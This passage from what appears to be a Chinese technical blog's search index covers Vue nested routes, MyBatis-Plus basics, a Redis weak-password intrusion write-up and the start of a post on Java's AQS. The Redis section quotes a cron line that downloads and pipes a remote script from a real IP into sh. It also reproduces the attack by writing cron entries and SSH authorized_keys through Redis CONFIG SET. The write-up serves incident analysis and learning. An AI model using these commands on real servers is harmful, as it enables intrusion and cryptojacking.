&quot;../components/Homenews&quot;; </span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">path</span>: <span class=\"string\">&#x27;/home&#x27;</span>,</span><br><span class=\"line\">    <span class=\"attr\">component</span>: Home,</span><br><span class=\"line\">    <span class=\"attr\">children</span>: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"attr\">path</span>: <span class=\"string\">&#x27;news&#x27;</span>,</span><br><span class=\"line\">        <span class=\"attr\">component</span>: <span class=\"function\">()=&gt;</span><span class=\"keyword\">import</span>(<span class=\"string\">&#x27;../components/Homenews&#x27;</span>)</span><br><span class=\"line\">      <span class=\"comment\">//component: Homenews</span></span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"attr\">path</span>: <span class=\"string\">&#x27;messages&#x27;</span>,</span><br><span class=\"line\">        <span class=\"attr\">component</span>: <span class=\"function\">()=&gt;</span><span class=\"keyword\">import</span>(<span class=\"string\">&#x27;../components/Homemessages&#x27;</span>)</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n\n<p>  在父组件的vue文件中编写相关的router-link与router-view,router-link要写完整路径</p>\n  <figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span>&gt;</span> </span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h2</span>&gt;</span>我是首页<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>我是首页内容，哈哈哈<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">router-link</span> <span class=\"attr\">to</span>=<span class=\"string\">&quot;/home/news&quot;</span>&gt;</span>新闻<span class=\"tag\">&lt;/<span class=\"name\">router-link</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">router-link</span> <span class=\"attr\">to</span>=<span class=\"string\">&quot;/home/messages&quot;</span>&gt;</span>消息<span class=\"tag\">&lt;/<span class=\"name\">router-link</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">router-view</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">router-view</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n</li>\n</ul>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220213164214432.png\" alt=\"image-20220213164214432\"></p>\n<p><code>&lt;router-link :to=&quot;&#123;path:&#39;/xxxx&#39;,query:&#123;name:&#39;why&#39;,age:&#39;12&#39;&#125;&#125;&quot;&gt;&lt;/router-link&gt;</code></p>\n<p>想要取用变量的话直接<code>&#123;&#123;$route.query&#125;&#125;</code>或者<code>&#123;&#123;$route.query.变量名&#125;&#125;</code></p>\n<p>如果是通过button跳转而不是router-link，可以直接</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"title\">onclick</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">  $this.router.push(&#123;</span><br><span class=\"line\">\t<span class=\"attr\">path</span>:<span class=\"string\">&#x27;/xxxx&#x27;</span>,</span><br><span class=\"line\">    <span class=\"attr\">query</span>:&#123;</span><br><span class=\"line\">        <span class=\"attr\">name</span>:<span class=\"string\">&#x27;abc&#x27;</span>,</span><br><span class=\"line\">        <span class=\"attr\">age</span>:<span class=\"number\">13</span>,</span><br><span class=\"line\">        </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">  </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h3 id=\"路由的懒加载\"><a href=\"#路由的懒加载\" class=\"headerlink\" title=\"路由的懒加载\"></a>路由的懒加载</h3><p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220213101415961.png\" alt=\"image-20220213101415961\"></p>\n<h1 id=\"请注意：与-的使用\"><a href=\"#请注意：与-的使用\" class=\"headerlink\" title=\"请注意：与 =的使用\"></a>请注意：与 =的使用</h1><p>箭头函数的this会一层层地往外找，普通函数的this是window</p>\n","categories":["前端"],"tags":["hexo"]},{"title":"MP的入门使用","url":"/p/66009/","content":"<h1 id=\"Mybatis-Plus\"><a href=\"#Mybatis-Plus\" class=\"headerlink\" title=\"Mybatis-Plus\"></a>Mybatis-Plus</h1><h2 id=\"入门\"><a href=\"#入门\" class=\"headerlink\" title=\"入门\"></a>入门</h2><p>写好的mapper接口继承mybatis-plus的BaseMapper接口，基本的增删改查就写好了。启动类记得扫描mapper包</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Repository</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">interface</span> <span class=\"title\">UserMapper</span> <span class=\"keyword\">extends</span> <span class=\"title\">BaseMapper</span>&lt;<span class=\"title\">User</span>&gt; </span>&#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@MapperScan(&quot;com.iu2wyt.mapper&quot;)</span>  或者上面加<span class=\"meta\">@Mapper</span></span><br></pre></td></tr></table></figure>\n\n<p>插入时如果没设置id会自动生成</p>\n<h3 id=\"主键自动生成策略\"><a href=\"#主键自动生成策略\" class=\"headerlink\" title=\"主键自动生成策略\"></a>主键自动生成策略</h3><p>（自增算法，uuid，雪花算法，zk，redis）</p>\n<blockquote>\n<p>​    默认ID_WORKER 全局唯一ID</p>\n</blockquote>\n<ol>\n<li>雪花算法，字段上<code>@TableId(type = IdtType.worker)</code>唯一</li>\n</ol>\n<p>snowflake是Twitter开源的分布式ID生成算法，结果是一个long型的ID（64位）。其核心思想是：前41bit使用当前毫秒数，10bit作为机器的ID（5个bit是数据中心位置代码，5个bit的机器ID），12bit作为毫秒内的流水号（意味着每个节点在每毫秒可以产生 4096个ID），最后还有一个符号位，永远是0。全球唯一</p>\n<blockquote>\n<p>​    主键自增</p>\n</blockquote>\n<ol start=\"2\">\n<li>需要配置主键自增，字段上<code>@TableId(type = IdtType.auto)</code>,同时注意数据库的字段也要自增 </li>\n</ol>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220216163047049.png\" alt=\"image-20220216163047049\"></p>\n<h2 id=\"日志\"><a href=\"#日志\" class=\"headerlink\" title=\"日志\"></a>日志</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mybatis-plus.configuration.log-impl=org.apache.ibatis.logging.stdout.StdOutImpl</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"自动填充\"><a href=\"#自动填充\" class=\"headerlink\" title=\"自动填充\"></a>自动填充</h2><p><code>@TableField</code></p>\n<h2 id=\"乐观锁\"><a href=\"#乐观锁\" class=\"headerlink\" title=\"乐观锁\"></a>乐观锁</h2><blockquote>\n<p>乐观锁：认为总是不会出现问题，干什么都上锁，如果出现问题，再次更新值测试！</p>\n<p>（当要更新记录时，希望这条记录没有被更新）</p>\n<p>乐观锁是相对悲观锁而言的，乐观锁假设数据一般情况不会造成冲突，所以在数据进行提交更新的时候，才会正式对数据的冲突与否进行检测，如果冲突，则返回给用户异常信息，让用户决定如何去做。乐观锁适用于读多写少的场景，这样可以提高程序的吞吐量。</p>\n<p>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>\n<p>实现步骤：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//1. 数据库增加version字段</span></span><br><span class=\"line\"><span class=\"comment\">//2. 在实体类中增加字段，并添加注解`@Version`</span></span><br><span class=\"line\"><span class=\"comment\">//3. 配置插件</span></span><br><span class=\"line\"><span class=\"meta\">@Bean</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> MybatisPlusInterceptor <span class=\"title\">mybatisPlusInterceptor</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    MybatisPlusInterceptor interceptor = <span class=\"keyword\">new</span> MybatisPlusInterceptor();</span><br><span class=\"line\">    interceptor.addInnerInterceptor(<span class=\"keyword\">new</span> OptimisticLockerInnerInterceptor());</span><br><span class=\"line\">    <span class=\"keyword\">return</span> interceptor;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>悲观锁：认为总是会出现问题，无论干什么都上锁！再去操作</p>\n</blockquote>\n<h2 id=\"批量查询\"><a href=\"#批量查询\" class=\"headerlink\" title=\"批量查询\"></a>批量查询</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Test</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">updateaBatchIds</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\tList&lt;User&gt; users = userMapper.selectBatchIds(Arrays.asList(<span class=\"number\">1L</span>, <span class=\"number\">5L</span>, <span class=\"number\">6L</span>));</span><br><span class=\"line\">\tusers.forEach(System.out::println);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"条件查询\"><a href=\"#条件查询\" class=\"headerlink\" title=\"条件查询\"></a>条件查询</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Test</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">selectByMap</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\tHashMap&lt;String, Object&gt; map = <span class=\"keyword\">new</span> HashMap&lt;String, Object&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">\tmap.put(<span class=\"string\">&quot;name&quot;</span>,<span class=\"string\">&quot;liudehua&quot;</span>);</span><br><span class=\"line\">\tmap.put(<span class=\"string\">&quot;age&quot;</span>,<span class=\"number\">23</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tList&lt;User&gt; users = userMapper.selectByMap(map);</span><br><span class=\"line\">\tSystem.out.println(users.toString());</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分页查询\"><a href=\"#分页查询\" class=\"headerlink\" title=\"分页查询\"></a>分页查询</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Test</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">testpage</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t\tPage&lt;User&gt; userPage = <span class=\"keyword\">new</span> Page&lt;&gt;(<span class=\"number\">2</span>,<span class=\"number\">5</span>);</span><br><span class=\"line\">\t\tuserMapper.selectPage(userPage,<span class=\"keyword\">null</span>);</span><br><span class=\"line\">\t\tSystem.out.println(userPage.getRecords());</span><br><span class=\"line\">\t\t<span class=\"comment\">//当前所在页数</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> <span class=\"keyword\">long</span> current = userPage.getCurrent();</span><br><span class=\"line\">\t\t<span class=\"comment\">//总记录数</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> <span class=\"keyword\">long</span> total = userPage.getTotal();</span><br><span class=\"line\">\t\t<span class=\"comment\">//总页数</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> <span class=\"keyword\">long</span> pages = userPage.getPages();</span><br><span class=\"line\">\t\t<span class=\"comment\">//设置当前的页码userPage.setCurrent(1)</span></span><br><span class=\"line\">\t\tSystem.out.println(<span class=\"string\">&quot;pages===================&gt;&quot;</span>+pages);</span><br><span class=\"line\">\t\tSystem.out.println(<span class=\"string\">&quot;total===================&gt;&quot;</span>+total);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"删除\"><a href=\"#删除\" class=\"headerlink\" title=\"删除\"></a>删除</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Test</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">testVariousDel</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t\tuserMapper.deleteBatchIds();</span><br><span class=\"line\">\t\tuserMapper.deleteById();</span><br><span class=\"line\">\t\tuserMapper.deleteByMap();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<blockquote>\n<p>逻辑删除：通过在数据库中修改某一字段的值逻辑上修改状态使其失效   </p>\n<p>​    如 deleteid=0 =&gt; deleteid=1,正常的deleteid字段值为0，逻辑删除后修改为1，在查询的时候带上条件deleteid=0就可以了。防止数据的丢失类似于回收站</p>\n<p>物理删除：从数据库中删除记录</p>\n</blockquote>\n<p>步骤：</p>\n<ol>\n<li><p>增加数据库字段以及实体表属性deleted</p>\n</li>\n<li><p>spring配置中增加默认删除得deleted值与没有删除的deleted值!收工</p>\n <figure class=\"highlight properties\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">mybatis-plus.global-config.db-config.logic-delete-field</span>=<span class=\"string\">1</span></span><br><span class=\"line\"><span class=\"meta\">mybatis-plus.global-config.db-config.logic-not-delete-value</span>=<span class=\"string\">0</span></span><br></pre></td></tr></table></figure></li>\n</ol>\n<p>之后在查询中会自动拼接deleted=0</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220221144748827.png\" alt=\"image-20220221144748827\"></p>\n<p>在删除时会执行更新操作<code>userMapper.deleteById(2L)</code>;</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220221144930554.png\" alt=\"image-20220221144930554\"></p>\n<h2 id=\"性能分析插件\"><a href=\"#性能分析插件\" class=\"headerlink\" title=\"性能分析插件\"></a>性能分析插件</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">  &lt;groupId&gt;p6spy&lt;/groupId&gt;</span><br><span class=\"line\">  &lt;artifactId&gt;p6spy&lt;/artifactId&gt;</span><br><span class=\"line\">  &lt;version&gt;最新版本&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"条件构造器\"><a href=\"#条件构造器\" class=\"headerlink\" title=\"条件构造器\"></a>条件构造器</h2><p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/77a65dd62de84930af4c681681b22c07.png\" alt=\"img\"></p>\n<p>通过链式编程将各个条件and在一起</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220221152636372.png\" alt=\"image-20220221152636372\"></p>\n<p>MySQL中，AND的执行优先级高于OR。也就是说，在没有小括号()的限制下，总是优先执行AND语句，再执行OR语句。</p>\n<h3 id=\"子查询\"><a href=\"#子查询\" class=\"headerlink\" title=\"子查询\"></a>子查询</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">test4</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">final</span> QueryWrapper&lt;User&gt; wrapper = <span class=\"keyword\">new</span> QueryWrapper&lt;&gt;();</span><br><span class=\"line\">   wrapper.inSql(<span class=\"string\">&quot;id&quot;</span>,<span class=\"string\">&quot;select id from user where id&gt;50&quot;</span>);</span><br><span class=\"line\">   userMapper.selectObjs(wrapper).forEach(System.out::println);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"orderby\"><a href=\"#orderby\" class=\"headerlink\" title=\"orderby\"></a>orderby</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Test</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">test5</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">final</span> QueryWrapper&lt;User&gt; wrapper = <span class=\"keyword\">new</span> QueryWrapper&lt;&gt;();</span><br><span class=\"line\">   wrapper.orderByAsc(<span class=\"string\">&quot;id&quot;</span>);</span><br><span class=\"line\">   userMapper.selectObjs(wrapper).forEach(System.out::println);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"代码自动生成器\"><a href=\"#代码自动生成器\" class=\"headerlink\" title=\"代码自动生成器\"></a>代码自动生成器</h2><p><a href=\"https://www.jb51.net/article/188251.html\">https://www.jb51.net/article/188251.html</a>  conusumer类详解，相当于一个处理器对接收的对象进行处理，但是没有返回值</p>\n<p><strong>3.5.1</strong>以上</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">\t\tFastAutoGenerator.create(<span class=\"string\">&quot;jdbc:mysql://localhost:3306/mybatis_plus?useSSL=false&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;serverTimezone=GMT%2B8&quot;</span>,<span class=\"string\">&quot;root&quot;</span>,<span class=\"string\">&quot;root&quot;</span>)</span><br><span class=\"line\">\t\t\t.globalConfig(builder -&gt; &#123;</span><br><span class=\"line\">\t\t\t\tbuilder.author(<span class=\"string\">&quot;ggxxyy&quot;</span>)</span><br><span class=\"line\">\t\t\t\t\t\t.enableSwagger()</span><br><span class=\"line\">\t\t\t\t\t\t.fileOverride()</span><br><span class=\"line\">\t\t\t\t\t\t.outputDir(<span class=\"string\">&quot;src\\\\main\\\\java&quot;</span>)</span><br><span class=\"line\">\t\t\t\t\t\t;</span><br><span class=\"line\">\t\t\t&#125;)</span><br><span class=\"line\">\t\t\t.packageConfig(builder -&gt; &#123;</span><br><span class=\"line\">\t\t\t\tbuilder.parent(<span class=\"string\">&quot;com.iu2wyt&quot;</span>)</span><br><span class=\"line\">\t\t\t\t\t\t.moduleName(<span class=\"string\">&quot;shop&quot;</span>)</span><br><span class=\"line\">\t\t\t\t\t\t.pathInfo(Collections.singletonMap(OutputFile.mapperXml,<span class=\"string\">&quot;src\\\\main\\\\java&quot;</span>))</span><br><span class=\"line\">\t\t\t\t\t\t.service(<span class=\"string\">&quot;serviceo&quot;</span>)</span><br><span class=\"line\">\t\t\t\t\t\t.mapper(<span class=\"string\">&quot;mapperb&quot;</span>)</span><br><span class=\"line\">\t\t\t\t\t\t.controller(<span class=\"string\">&quot;controllerj&quot;</span>)</span><br><span class=\"line\">\t\t\t\t\t\t.entity(<span class=\"string\">&quot;entitye&quot;</span>)</span><br><span class=\"line\">\t\t\t\t\t\t.xml(<span class=\"string\">&quot;testxml&quot;</span>)</span><br><span class=\"line\">\t\t\t\t\t\t.serviceImpl(<span class=\"string\">&quot;sim&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t&#125;)</span><br><span class=\"line\">\t\t\t.strategyConfig(builder -&gt; &#123;</span><br><span class=\"line\">\t\t\t\tbuilder.addInclude(<span class=\"string\">&quot;user&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t&#125;)</span><br><span class=\"line\">\t\t\t.templateEngine(<span class=\"keyword\">new</span> VelocityTemplateEngine())</span><br><span class=\"line\">\t\t\t.execute();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n\n<p>分别是全局配置，包配置，策略配置，模板引擎，执行</p>\n<p>记得导入模板引擎以及swagger的依赖</p>\n","categories":["java"]},{"title":"redis弱口令邂逅","url":"/p/65033/","content":"<h1 id=\"记一个由于redis弱口令导致被当成矿机的记录\"><a href=\"#记一个由于redis弱口令导致被当成矿机的记录\" class=\"headerlink\" title=\"记一个由于redis弱口令导致被当成矿机的记录\"></a>记一个由于redis弱口令导致被当成矿机的记录</h1><h2 id=\"起因\"><a href=\"#起因\" class=\"headerlink\" title=\"起因\"></a>起因</h2><p>不久前腾讯服务器发来一封邮件警告我,说服务器用于挖矿,需要清除.这个服务器是之前学习springboot以及分布式时用来搭建实际生产环境的,搭建有常见的数据库,nginx以及tomcat等环境</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220407105956525.png\" alt=\"image-20220407105956525\"></p>\n<p>震惊之余,我连忙连接上服务器查看,在连接ssh时就发现连接速度十分慢,估计有个将近1分钟,并且输入命令查询延迟十分高,估计是挖矿占用cpu过高.</p>\n<h2 id=\"排除过程\"><a href=\"#排除过程\" class=\"headerlink\" title=\"排除过程\"></a>排除过程</h2><p>先到腾讯服务器的控制台查看最近的外网流量进出以及磁盘的读写,发现最近几天cpu持续跑满,我连忙去查看3月17日的登录日志发现了一有个登录,印象中好久没有登录过这台服务器了,于是在腾讯的安全控制台中找到了这个ip,是一个广西的ip</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220407111701896.png\" alt=\"image-20220407111701896\"></p>\n<ul>\n<li><p>通过<code>top -c</code>查看后找到占用最高的进程并找到其位置将其删除.</p>\n</li>\n<li><p>同时检查所有的定时任务文件<code>crontab -l</code>发现了有一个redis的乱码如下</p>\n<p>  <img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220407112531554.png\" alt=\"image-20220407112531554\"></p>\n<p>  在了解了定时任务的配置后,明白了这个文件中的3条命令每分钟触发一次,其中<code>cdt</code>与<code>wdt</code>在网上没有相关信息猜想可能是其他类型的主机上命令,只有<code>wget</code>能看懂,每分钟从<code>http://103.209.103.16:26800/ff.sh</code>下载文件并运行.可惜这个url已经失效了,查询一下是香港的vps,可能为了逃避法律责任,这台服务器已经到期了.</p>\n</li>\n</ul>\n<h2 id=\"修复过程\"><a href=\"#修复过程\" class=\"headerlink\" title=\"修复过程\"></a>修复过程</h2><p>首先将所有定时任务删除掉并禁用定时任务</p>\n<p>linux的定时任务有两种:</p>\n<ol>\n<li>系统的定时任务</li>\n</ol>\n<p>位于/etc/crontab 这个文件负责调度各种管理和维护任务。</p>\n<ol start=\"2\">\n<li>用户的定时任务</li>\n</ol>\n<p>/var/spool/cron/ 目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名</p>\n<ol start=\"3\">\n<li>其他</li>\n</ol>\n<p>还可以把脚本放在/etc/cron.hourly、/etc/cron.daily、/etc/cron.weekly、/etc/cron.monthly目录中，让它每小时/天/星期、月执行一次。</p>\n<p>检查rc.*文件是否有设置开机自启动</p>\n<p>同时删除掉下载的挖矿文件,</p>\n<p>利用<code>iptables -L -n</code>查看可疑的 地址与端口没有发现,</p>\n<p>利用<code>netstat -ntlp</code>查看端口占用防止有后门</p>\n<h2 id=\"复现过程\"><a href=\"#复现过程\" class=\"headerlink\" title=\"复现过程\"></a>复现过程</h2><p>在看到redis后想起之前部署redis时为了方便便把密码设置成了123456(因小失大!!:sob:),于是重新复现了这个漏洞</p>\n<p>连接到redis</p>\n<blockquote>\n<p><code>redis-cli -h target -a password(如果有的话)</code></p>\n</blockquote>\n<p>设置键</p>\n<blockquote>\n<p><code>set bar(名称随意) 定时任务</code></p>\n</blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 也可以直接实现</span></span><br><span class=\"line\">echo &quot;*/1 * * * * wget -O - http://103.209.103.16:26800/ff.sh | sh -s&quot; &gt; foo.txt</span><br><span class=\"line\">cat foo.txt | redis-cli -h target -a password -x set foo </span><br></pre></td></tr></table></figure>\n\n\n\n<p>redis持久化,</p>\n<p>redis的config命令可以在redis运行中动态修改redis的配置,其中set后面的字段为配置字段名,重启后会失效,如果需要同步到配置文件中可以通过save命令实现</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">config set dir /var/spool/cron</span><br><span class=\"line\">config set dbfilename &quot;root&quot;</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> save实现持久化,将键值对写入,由于是文本文件打开,而不是db形式打开,所以会有乱码</span></span><br><span class=\"line\">save </span><br><span class=\"line\">exit</span><br></pre></td></tr></table></figure>\n\n<p>在写入cron后每一分钟就会实现一次.</p>\n<p>如果将命令换成公钥</p>\n<p>首先攻击者在本地生成好公私钥,通过redis实体化到target上最后用ssh的私钥登录</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa -C &quot;your_email@example.com&quot;</span><br><span class=\"line\">(echo -e &quot;\\n&quot;;cat od_rsa.pub;echo -e &quot;\\n&quot;) &gt; foo.txt</span><br><span class=\"line\">cat foo.txt | redis-cli -h target -a password -x set foo </span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 一样持久化</span></span><br><span class=\"line\">config set dir /root/.ssh</span><br><span class=\"line\">config set dbfilename &quot;authorized_keys&quot;</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> save实现持久化,将键值对写入,由于是文本文件打开,而不是db形式打开,所以会有乱码</span></span><br><span class=\"line\">save </span><br><span class=\"line\">exit</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 通过ssh连接</span></span><br><span class=\"line\">ssh -i id_rsa target</span><br></pre></td></tr></table></figure>\n\n\n\n<p>如果authorized_keys无法写入(root也无法修改),需要通过<code>lsattr </code>与<code>chattr</code>修改其属性</p>\n<p><strong>PS：有时候你发现用root权限都不能修改某个文件，大部分原因是曾经用chattr命令锁定该文件了。chattr命令的作用很大，其中一些功能是由Linux内核版本来支持的，不过现在生产绝大部分跑的linux系统都是2.6以上内核了。通过chattr命令修改属性能够提高系统的安全性，但是它并不适合所有的目录。chattr命令不能保护/、/dev、/tmp、/var目录。lsattr命令是显示chattr命令设置的文件属性。</strong></p>\n<p>这两个命令是用来查看和改变文件、目录属性的，与chmod这个命令相比，chmod只是改变文件的读写、执行权限，更底层的属性控制是由chattr来改变的。</p>\n<blockquote>\n<p>+ ：在原有参数设定基础上，追加参数。</p>\n<p>- ：在原有参数设定基础上，移除参数。<br>= ：更新为指定参数设定。<br>A：文件或目录的 atime (access time)不可被修改(modified), 可以有效预防例如手提电脑磁盘I/O错误的发生。<br>S：硬盘I/O同步选项，功能类似sync。<br>a：即append，设定该参数后，只能向文件中添加数据，而不能删除，多用于服务器日志文件安全，只有root才能设定这个属性。<br>c：即compresse，设定文件是否经压缩后再存储。读取时需要经过自动解压操作。<br>d：即no dump，设定文件不能成为dump程序的备份目标。<br>i：设定文件不能被删除、改名、设定链接关系，同时不能写入或新增内容。<br>i参数对于文件 系统的安全设置有很大帮助。<br>j：即journal，设定此参数使得当通过mount参数：data=ordered 或者 data=writeback 挂  载的文件系统，文件在写入时会先被记录(在journal中)。如果filesystem被设定参数为 data=journal，则该参数自动失效。<br>s：保密性地删除文件或目录，即硬盘空间被全部收回。<br>u：与s相反，当设定为u时，数据内容其实还存在磁盘中，可以用于undeletion。 各参数选项中常用到的是a和i。a选项强制只可添加不可删除，多用于日志系统的安全设定。而i是更为严格的安全设定，只有superuser (root) 或具有CAP_LINUX_IMMUTABLE处理能力（标识）的进程能够施加该选项。</p>\n</blockquote>\n","categories":["渗透测试"]},{"title":"AQS详解","url":"/p/65034/","content":"<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220526195408438.png\" alt=\"image-20220526195408438\"></p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220527195219135.png\" alt=\"image-20220527195219135\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">FairSync</span> <span class=\"keyword\">extends</span> <span class=\"title\">Sync</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> serialVersionUID = -<span class=\"number\">3000897897090466540L</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">final</span> <span class=\"keyword\">void</span> <span class=\"title\">lock</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//加入等待队列acquire(1);</span></span><br><span class=\"line\">        acquire(<span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//AQS的acquire方法会调用tryAcquire，判断是否获取锁成功。tryAcquire是子类实现的模板</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">final</span> <span class=\"keyword\">boolean</span> <span class=\"title\">tryAcquire</span><span class=\"params\">(<span 